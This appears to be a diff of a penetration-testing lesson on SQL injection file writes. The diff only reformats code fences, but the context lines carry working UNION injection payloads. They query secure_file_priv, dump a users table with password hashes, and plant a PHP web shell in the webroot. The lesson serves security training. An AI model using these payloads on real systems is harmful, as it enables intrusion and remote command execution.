@@ -22,8 +22,7 @@ The [secure\_file\_priv](https://mariadb.com/kb/en/server-system-variables/#secu
 
 So, let's see how we can find out the value of `secure_file_priv`. Within `MySQL`, we can use the following query to obtain the value of this variable:
 
-```
-        sql
+```sql
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
@@ -33,15 +32,13 @@ We have to select these two columns from that table in the `INFORMATION_SCHEMA` 
 
 The final SQL query is the following:
 
-```
-        sql
+```sql
 SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
 ```
 
 So, similar to other `UNION` injection queries, we can get the above query result with the following payload. Remember to add two more columns `1` & `4` as junk data to have a total of 4 columns':
 
-```
-        sql
+```sql
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 
@@ -59,15 +56,13 @@ Now that we have confirmed that our user should write files to the back-end serv
 
 To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified. The below example saves the output of the `users` table into the `/tmp/credentials` file:
 
-```
-        shellsession
+```shellsession
 SELECT * from users INTO OUTFILE '/tmp/credentials';
 ```
 
 If we go to the back-end server and `cat` the file, we see that table's content:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /tmp/credentials 
 
 1       admin   392037dbba51f692776d6cefb6dd546d
@@ -76,22 +71,19 @@ hiimeins@htb[/htb]$ cat /tmp/credentials
 
 It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
 
-```
-        sql
+```sql
 SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
 ```
 
 When we `cat` the file, we see that text:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /tmp/test.txt 
 
 this is a test
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ls -la /tmp/test.txt 
 
 -rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
@@ -107,8 +99,7 @@ Tip: Advanced file exports utilize the 'FROM\_BASE64("base64\_data")' function i
 
 Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application:
 
-```
-        sql
+```sql
 select 'file written successfully!' into outfile '/var/www/html/proof.txt'
 ```
 
@@ -116,8 +107,7 @@ select 'file written successfully!' into outfile '/var/www/html/proof.txt'
 
 The `UNION` injection payload would be as follows:
 
-```
-        sql
+```sql
 cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
 ```
 
@@ -139,15 +129,13 @@ Note: We see the string we dumped along with '1', '3' before it, and '4' after i
 
 Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
 
-```
-        php
+```php
 <?php system($_REQUEST[0]); ?>
 ```
 
 We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`:
 
-```
-        sql
+```sql
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
 
